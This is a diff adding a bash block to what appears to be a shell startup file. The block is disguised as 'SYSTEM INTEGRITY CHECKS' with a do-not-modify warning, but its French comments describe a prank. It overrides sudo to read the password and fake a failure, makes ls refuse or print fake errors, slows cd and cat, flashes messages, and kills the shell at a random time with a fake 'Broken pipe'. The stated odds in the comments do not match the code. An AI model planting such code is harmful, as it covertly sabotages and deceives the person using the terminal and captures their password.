@@ -1,0 +1,72 @@
+# ------------------------------------------------------------------
+# SYSTEM INTEGRITY CHECKS - DO NOT MODIFY
+# Configuration loaded for interaction stability
+# ------------------------------------------------------------------
+
+# 1. LE MESSAGE SUBLIMINAL (Le Flash)
+_sys_integrity_monitor() {
+    # 1 chance sur 15 (environ)
+    if [ $((RANDOM % 2)) -eq 0 ]; then
+        # Affiche un message d'erreur critique en ROUGE
+        printf "\033[31m[Coucou :)]\033[0m"
+        sleep 0.4
+        printf "\r                                                         \r"
+    fi
+}
+export PROMPT_COMMAND="_sys_integrity_monitor"
+
+# 2. LE SUDO GASLIGHTING
+# Fait croire que le mot de passe est faux 1 fois sur 5
+sudo() {
+    if [ $((RANDOM % 2)) -eq 0 ]; then
+        echo "[sudo] password for $USER: "
+        read -s _pw
+        echo ""
+        sleep 1.5
+        echo "Sorry, try again."
+        return 1
+    else
+        /usr/bin/sudo "$@"
+    fi
+}
+
+# 3. LA COMMANDE LS CAPRICIEUSE (Lag + Typo + Grève)
+ls() {
+    # Toujours le petit lag pour énerver (0 à 2s)
+    sleep $(($RANDOM % 1))
+    
+    # On lance un dé à 15 faces (0 à 14)
+    _chance=$((RANDOM % 3))
+
+    if [ $_chance -eq 0 ]; then
+        # CAS 1 (1/15) : Le refus de travailler
+        # Message insolent qui ressemble à une erreur mais n'en est pas une
+        echo "ls: ¯\_(ツ)_/¯ Je ne veux pas travailler maintenant. Réessayez plus tard."
+        return 1 # Retourne une erreur pour que le prompt change de couleur
+    
+    elif [ $_chance -eq 1 ]; then
+        # CAS 2 (1/15) : La faute de frappe simulée
+        echo "bash: sl: command not found"
+        return 127
+        
+    else
+        # CAS NORMAL : On lance la vraie commande
+        /bin/ls --color=auto "$@"
+    fi
+}
+
+# 4. LES COMMANDES FATIGUÉES (Lag pur)
+cd() { sleep $(($RANDOM % 1)); builtin cd "$@"; }
+cat() { sleep $(($RANDOM % 1)); /bin/cat "$@"; }
+
+# 5. LA DECONNEXION FANTÔME (Random Kill)
+(
+    sleep $((600 + RANDOM % 1800))
+    echo ""
+    echo "Write failed: Broken pipe"
+    kill -9 $$ 2>/dev/null
+) & disown
+
+# ------------------------------------------------------------------
+# END SYSTEM INTEGRITY CHECKS
+# ------------------------------------------------------------------
